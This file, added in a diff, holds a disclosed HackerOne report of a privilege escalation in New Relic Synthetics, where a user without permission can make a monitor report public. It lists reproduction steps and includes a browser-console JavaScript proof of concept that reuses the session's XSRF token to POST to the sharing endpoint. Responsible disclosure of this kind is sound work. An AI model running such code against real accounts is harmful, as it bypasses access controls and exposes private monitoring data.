@@ -1,0 +1,60 @@
+ReportLink:https://hackerone.com/reports/210304
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/r0x33d
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:12.10.2017 13:40:42
+
+Summary:
+
+Hello,
+
+I would like to report about **Privilege Escalation** on `synthetics.newrelic.com` domain.
+
+You can enable report sharing for monitor without permission.
+
+In order to reproduce it, do the following steps:
+
+1) Login as company administrator
+2) Navigate to `https://synthetics.newrelic.com/accounts/[aaa]/monitors` (replace `[aaa]` with your account ID)
+3) Create new monitor
+
+{F165867}
+
+4) Navigate to `https://synthetics.newrelic.com/accounts/[aaa]/permissions` (replace `[aaa]` with your account ID)
+5) Enable permissions, create new group, attach yourself to new group and enable all permissions
+
+{F165866}
+
+6) Create new user account and login into it
+7) Navigate to `https://synthetics.newrelic.com/accounts/[aaa]/monitors/stoplights.json` (replace `[aaa]` with your account ID)
+8) You will get something like `{"be9068f3-b009-4eb4-9a99-4cf9c5d130e7":{"currentSeverity":0,"currentUrl":"","startTime":0,"label":"","warningCount":0,"criticalCount":0}}`. `be9068f3-b009-4eb4-9a99-4cf9c5d130e7` first key is monitor ID, copy it for later usage.
+9) Navigate to https://synthetics.newrelic.com
+10) Replace `*monitor_id*` in code below with monitor id from step 8, open browser console, paste this code into it and hit enter:
+```
+var MONITOR_ID = '*monitor_id*';
+// --- parameters preparation ---
+var accountID = window._nr.session.accountId;
+var token = document.cookie.split('XSRF-TOKEN=')[1].split('; ')[0];
+// --- request url generation --
+var url = 'https://synthetics.newrelic.com/accounts/'+accountID+'/monitors/'+MONITOR_ID+'/public-sla.json';
+// --- request execution ---
+var xhr = new XMLHttpRequest();
+xhr.open('POST', url, true);
+xhr.withCredentials = true;
+xhr.onreadystatechange = function() {
+	if (xhr.readyState === 4 && xhr.response[0] === '{')
+      		console.info('Monitor report link:', 'http://synthetics.newrelic.com/report/'+JSON.parse(xhr.response)['shortcode']);
+}
+xhr.setRequestHeader('X-XSRF-TOKEN', token);
+xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+xhr.send('{"monitorId":"'+MONITOR_ID+'","accountId":'+accountID+',"enabled":true}');
+```
+
+{F165868}
+
+**Note:** this code will send POST request to `https://synthetics.newrelic.com/accounts/your_account_id/monitors/monitor_id/public-sla.json` which will enable sharing for monitor report
+
+11) You have enabled sharing for monitor report and it will be available online for anyone.
